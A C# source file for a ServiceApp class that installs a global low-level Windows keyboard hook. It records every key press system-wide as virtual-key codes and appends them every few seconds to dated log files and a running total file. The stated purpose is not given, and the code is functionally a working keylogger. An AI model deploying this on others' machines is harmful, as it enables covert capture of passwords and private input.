using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Media.Animation;

namespace ServiceApp
{
    public static class KeyboardHook
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static StringBuilder buffer = new StringBuilder();
        private static IntPtr _hookId = IntPtr.Zero;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static System.Timers.Timer timer;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public static void StartHook()
        {
            _hookId = SetHook(_proc);

            timer = new System.Timers.Timer(3000); 
            timer.Elapsed += Timer_Elapsed;
            timer.AutoReset = true;
            timer.Start();
        }

        public static void StopHook()
        {
            UnhookWindowsHookEx(_hookId);

            timer?.Stop();
            timer?.Dispose();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using var curProcess = Process.GetCurrentProcess();
            using var curModule = curProcess.MainModule;

            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
        private static int ok = 0;
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Debug.WriteLine($"Key pressed: {vkCode}");
                buffer.Append(vkCode);
                string hour = DateTime.Now.Hour.ToString();
                //buffer.Append($":" + hour);
                if(ok != 9)
                buffer.Append(" ");

                ok++;
                if (ok == 10)
                {
                    buffer.AppendLine();
                    ok = 0;
                }

            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private static void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            if (buffer.Length == 0)
                return;

            string data = buffer.ToString();

            buffer.Clear();

            string folder = System.AppDomain.CurrentDomain.BaseDirectory + "\\Logs";

            string todayFile = Path.Combine(folder, DateTime.Now.ToString("yyyy-MM-dd") + ".txt");

            File.AppendAllText(todayFile, data);

            string totalFile = Path.Combine(folder, "total.txt");
            File.AppendAllText(totalFile, data);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
